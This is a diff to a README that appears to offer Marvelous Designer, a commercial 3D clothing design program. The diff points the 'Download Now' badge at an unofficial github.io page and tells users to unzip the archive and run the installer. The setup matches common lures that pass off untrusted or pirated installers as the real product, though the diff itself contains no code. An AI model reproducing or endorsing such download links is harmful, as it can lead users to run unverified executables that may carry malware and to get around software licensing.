@@ -8,7 +8,7 @@ Fashion designers use Marvelous Designer to prototype clothing digitally, while 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://marvelous-designer-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and follow on-screen instructions.  
